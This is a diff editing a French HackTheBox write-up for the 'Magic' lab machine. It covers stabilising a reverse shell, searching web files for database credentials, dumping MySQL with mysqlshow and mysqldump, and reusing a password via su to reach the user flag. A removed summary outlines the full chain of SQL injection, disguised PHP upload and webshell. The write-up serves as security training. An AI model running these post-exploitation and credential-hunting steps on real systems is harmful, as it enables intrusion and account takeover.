@@ -755,28 +755,30 @@ Injection SQL
 
 ### Stabilisation du shell
 
-Le reverse shell obtenu fonctionne, mais il reste basique. Pour rendre l’interaction plus confortable, on le stabilise avec la méthode classique.
+Le reverse shell obtenu fonctionne, mais il reste basique. Pour rendre l’interaction plus confortable, tu peux le stabiliser avec la méthode classique. 
 
-Dans le shell distant :
+Cette étape est détaillée dans la recette dédiée : {{< recette "stabiliser-reverse-shell" >}}. 
+
+Dans le shell distant, tu commences par obtenir un pseudo-terminal avec Python :
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-Ensuite, côté Kali, on suspend le shell avec `Ctrl+Z`, puis on configure le terminal local :
+Ensuite, côté Kali, tu suspends le shell avec `Ctrl+Z`, puis tu configures le terminal local :
 
 ```bash
 stty raw -echo; fg
 ```
 
-Après le retour dans le shell distant, on termine la stabilisation :
+Après le retour dans le shell distant, tu termines la stabilisation :
 
 ```bash
 export TERM=xterm
 stty rows 40 columns 120
 ```
 
-À partir de ce moment, le shell est plus agréable à utiliser : l’affichage est meilleur, les commandes interactives fonctionnent mieux, et l’on peut poursuivre l’énumération locale dans de meilleures conditions.
+À partir de ce moment, ton shell devient plus agréable à utiliser : l’affichage est meilleur, les commandes interactives fonctionnent mieux, et tu peux poursuivre l’énumération locale dans de meilleures conditions.
 
 ### Exploration de l’environnement
 
@@ -852,15 +854,15 @@ Le répertoire `.ssh` existe également, mais il est protégé :
 drwx------ 2 theseus theseus .ssh
 ```
 
-Là encore, `www-data` ne peut pas simplement y entrer pour récupérer une clé SSH.
+Là encore, `www-data` ne peut pas simplement y entrer pour récupérer une éventuelle clé SSH.
 
 Cette vérification confirme donc l’objectif de la suite : il faut trouver un moyen de passer de `www-data` à l’utilisateur `theseus`.
 
-Comme l’application web tourne en PHP dans `/var/www`, la piste logique suivante consiste à rechercher des fichiers de configuration pouvant contenir des identifiants.
+Comme l’application web est une application PHP hébergée dans `/var/www`, tu peux ensuite chercher des fichiers de configuration ou des fichiers liés à la base de données.
 
-Comme l’application web est une application PHP hébergée dans `/var/www`, tu peux ensuite rechercher des fichiers de configuration ou des fichiers liés à une base de données.
+Cette recherche est assez générique dans un environnement PHP. Dans beaucoup d’applications, les fichiers contenant `config`, `db` ou `database` dans leur nom servent à stocker des paramètres importants : connexion MySQL, nom de la base, utilisateurs, mots de passe ou hôtes.
 
-Une commande générique utile consiste à chercher les noms de fichiers contenant `config`, `db` ou `database` :
+Tu peux donc lancer une recherche ciblée dans `/var/www` :
 
 ```
 find /var/www -type f \( -iname "*config*" -o -iname "*db*" -o -iname "*database*" \) 2>/dev/null
@@ -872,9 +874,7 @@ La commande retourne un fichier intéressant :
 /var/www/Magic/db.php5
 ```
 
-Le nom du fichier est parlant : `db.php5` suggère un fichier PHP lié à la base de données de l’application.
-
-Tu peux donc le lire :
+Comme ce fichier appartient à l’application web et qu’il semble lié à la base de données, tu peux tenter de le lire :
 
 ```
 cat /var/www/Magic/db.php5
@@ -921,7 +921,7 @@ class Database
 }
 ```
 
-Les informations importantes sont les suivantes :
+Le fichier contient les informations utilisées par l’application pour se connecter à MySQL :
 
 ```
 base de données : Magic
@@ -930,19 +930,13 @@ utilisateur     : theseus
 mot de passe    : iamkingtheseus
 ```
 
-Ce fichier est très intéressant pour deux raisons.
-
-D’abord, il montre que l’application utilise une base MySQL locale appelée `Magic`.
-
-Ensuite, il révèle un couple d’identifiants :
+Ces informations te donnent un accès probable à la base MySQL locale `Magic` avec le compte suivant :
 
 ```
 theseus:iamkingtheseus
 ```
 
-Comme l’utilisateur local `theseus` existe sur la machine, un premier réflexe consiste à tester si ce mot de passe est réutilisé pour le compte Linux.
-
-Tu peux donc tenter une connexion SSH depuis Kali :
+Comme l’utilisateur local `theseus` existe sur la machine, tu pourrais être tenté de tester directement ces identifiants en SSH depuis Kali :
 
 ```
 ssh theseus@magic.htb
@@ -954,25 +948,72 @@ Avec le mot de passe :
 iamkingtheseus
 ```
 
-Cette tentative échoue. Le mot de passe trouvé dans `db.php5` ne permet donc pas de se connecter directement au compte système `theseus`.
+La tentative échoue cependant avec le message suivant :
 
-En revanche, ces identifiants sont bien utilisés par l’application pour se connecter à la base MySQL locale. La suite consiste donc à les utiliser pour explorer la base de données `Magic`.
+```txt
+theseus@magic.htb: Permission denied (publickey).
+```
+
+Ce message indique que le serveur SSH attend une authentification par clé publique. L’authentification par mot de passe n’est donc pas utilisable ici pour tester directement le mot de passe trouvé dans `db.php5`.
+
+Les identifiants trouvés dans `db.php5` restent toutefois une piste intéressante. Comme ils apparaissent dans le fichier de connexion de l’application, ils peuvent probablement permettre d’interroger la base MySQL locale.
+
+La suite consiste donc à tester cet accès et à explorer la base de données `Magic`.
 
 ### Exploration de la base MySQL Magic
+
+Normalement, tu pourrais utiliser le client `mysql` pour te connecter à la base de données de manière interactive :
 
 ```bash
 mysql -u theseus -p
 ```
 
-Mais sur la machine cible, le binaire `mysql` n’est pas disponible. Cela ne bloque pas complètement l’énumération, car d’autres outils liés à MySQL sont présents.
+Mais la commande n’est pas disponible sur la machine cible.
 
-Tu peux les rechercher avec :
+Pour ne pas s’arrêter là, tu peux chercher les autres outils MySQL présents dans les répertoires classiques des exécutables Linux : `/usr/bin`, `/usr/sbin`, `/bin` et `/sbin`.
 
 ```bash
-which mysql mysqlshow mysqldump
+find /usr/bin /usr/sbin /bin /sbin -iname "*mysql*" 2>/dev/null
 ```
 
-Même si `mysql` est absent, `mysqlshow` et `mysqldump` permettent encore d’interroger la base.
+Cette recherche permet d’identifier notamment `mysqlshow` et `mysqldump`.
+
+```bash
+/usr/bin/mysqloptimize
+/usr/bin/mysqldump
+/usr/bin/mysqladmin
+/usr/bin/mysqlshow
+/usr/bin/mysqld_safe
+/usr/bin/mysqlbinlog
+/usr/bin/mysqldumpslow
+/usr/bin/mysqlcheck
+/usr/bin/mysql_ssl_rsa_setup
+/usr/bin/mysqlimport
+/usr/bin/mysql_tzinfo_to_sql
+/usr/bin/mysql_upgrade
+/usr/bin/mysqlslap
+/usr/bin/mysql_secure_installation
+/usr/bin/mysqlrepair
+/usr/bin/mysqlanalyze
+/usr/bin/mysql_config_editor
+/usr/bin/mysqld_multi
+/usr/bin/mysql_plugin
+/usr/bin/mysql_embedded
+/usr/bin/mysql_install_db
+/usr/bin/mysqlpump
+/usr/bin/mysqlreport
+/usr/sbin/mysqld
+```
+
+La différence est simple :
+
+```
+mysql      → client interactif classique
+mysqlshow  → outil pour lister les bases et les tables
+mysqldump  → outil pour exporter le contenu d’une base ou d’une table
+```
+
+Même sans le client interactif `mysql`, tu peux donc continuer l’énumération avec `mysqlshow`, puis lire le contenu intéressant avec `mysqldump`.
 
 Tu peux d’abord vérifier l’accès à la base `Magic` avec `mysqlshow` :
 
@@ -1026,85 +1067,58 @@ Comme le compte local `theseus` existe sur la machine, la prochaine étape logiq
 
 ### Réutilisation du mot de passe pour devenir theseus
 
-Comme l’utilisateur local `theseus` existe sur la machine, un premier réflexe pourrait être de tester une connexion SSH depuis Kali :
-
-```bash
-ssh theseus@magic.htb
-```
-
-La tentative échoue immédiatement avec le message suivant :
+Plus tôt dans l’énumération, tu as déjà constaté que l’accès SSH à `theseus` demande une authentification par clé publique :
 
 ```text
 theseus@magic.htb: Permission denied (publickey).
 ```
 
-Ce message indique que le serveur SSH attend une authentification par clé publique. L’authentification par mot de passe n’est donc pas utilisable ici pour tester directement le mot de passe trouvé dans `db.php5`.
+Le mot de passe trouvé dans la base de données ne peut donc pas être testé directement avec SSH.
 
-Depuis le shell `www-data`, on tente alors de changer d’utilisateur :
+Il faut donc continuer depuis le reverse shell obtenu en tant que `www-data`.
+
+Depuis ce shell, tu peux tenter de changer d’utilisateur avec `su` :
 
 ```bash
 su - theseus
 ```
 
-Lorsque le mot de passe est demandé, on fournit :
+Lorsque le mot de passe est demandé, tu fournis celui récupéré dans la base de données :
 
 ```text
 Th3s3usW4sK1ng
 ```
 
-Le changement d’utilisateur fonctionne. Nous passons alors du contexte web `www-data` au compte local `theseus`.
+Cette fois, le changement d’utilisateur fonctionne. Tu passes donc du contexte web `www-data` au compte local `theseus`.
 
-On peut confirmer l’identité courante avec :
+Tu peux confirmer ton identité avec :
 
 ```bash
 id
 ```
 
-donne 
+La sortie confirme que tu es bien connecté en tant que `theseus` :
 
 ```bash
 uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
 ```
 
-Nous pouvons ensuite lire le flag utilisateur :
+### Lecture de user.xtx
+
+Tu peux maintenant lire le flag utilisateur :
 
 ```bash
 cat user.txt
 6461************************d728
 ```
 
-### Résumé de la chaîne de prise de pied
+À ce stade, tu as terminé la prise pied : tu es passé du contexte web `www-data` au compte utilisateur `theseus` et tu peux lire `user.txt`. 
 
-La prise de pied sur Magic repose sur une chaîne progressive assez classique, mais très pédagogique.
-
-On commence par contourner l’authentification grâce à une injection SQL. Cela donne accès à une fonctionnalité d’upload, qui est ensuite détournée pour envoyer un fichier PHP déguisé en image. Ce fichier devient un webshell permettant d’exécuter des commandes en tant que `www-data`.
-
-À partir de ce webshell, un reverse shell Bash est lancé vers Kali, puis stabilisé. L’énumération locale permet ensuite de découvrir le fichier `/var/www/Magic/db.php5`, qui contient les identifiants MySQL de l’application.
-
-Comme le client `mysql` n’est pas disponible, on utilise `mysqlshow` et `mysqldump` pour explorer la base `Magic`. Le dump de la table `login` révèle un mot de passe, qui est ensuite réutilisé avec succès pour passer sur l’utilisateur local `theseus`.
-
-La chaîne complète est donc :
-
-```text
-SQL injection
-→ accès à la zone d’upload
-→ fichier PHP déguisé en image
-→ webshell
-→ reverse shell www-data
-→ découverte de db.php5
-→ accès MySQL
-→ dump de la table login
-→ réutilisation du mot de passe
-→ utilisateur theseus
-```
-
----
+La suite consiste maintenant à chercher un moyen d’élever les privilèges pour obtenir un accès root.
 
 ## Escalade de privilèges
 
-{{< escalade-intro user="ssh_user" >}}
-
-## Escalade de privilèges
+{{< escalade-intro user="thesus" >}}
 
 ### Observation passive avec pspy64
 
